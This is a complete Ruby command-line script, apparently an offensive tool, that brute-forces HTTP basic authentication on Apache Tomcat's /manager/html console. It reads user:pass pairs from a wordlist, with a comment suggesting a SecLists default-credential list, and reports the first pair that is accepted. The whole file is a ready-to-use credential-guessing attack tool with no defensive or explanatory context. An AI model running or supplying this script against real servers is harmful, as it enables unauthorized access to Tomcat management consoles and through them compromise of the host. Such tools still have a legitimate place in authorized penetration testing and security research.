require 'net/http'
require 'optparse'

# Suggestion for a good wordlist: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt

options = {}
OptionParser.new do |opts|
  opts.banner = "Usage: ruby tomcat-brute.rb -w [WORDLIST] -H [HOST] -P [PORT]"

  opts.on("-wWORD", "--wordlist=WORD", "select a dictionnary with this kind of structure user:pass") do |w|
    options[:wordlist] = w
  end

  opts.on("-HHOST", "--hostname=HOSTNAME", "select a host target") do |h|
    options[:hostname] = h
  end

  opts.on("-PPORT", "--port=PORT", "select a port") do |p|
    options[:port] = p
  end

  opts.on("-h", "--help", "prints this help") do |h|
    puts opts
    exit
  end
end.parse!

file = File.open(options[:wordlist])
file_data = file.readlines.map(&:chomp)
file_data.each do |word|
  username, pass = word.split(":")
  http = Net::HTTP.new(options[:hostname], options[:port])
  req = Net::HTTP::Get.new("http://#{options[:hostname]}/manager/html")
  req.basic_auth(username, pass)
  res = http.request(req)
  if res.code == "200" then 
    puts "[*] Found valid credentials: #{username} with #{pass}"
    return
  end
end
file.close
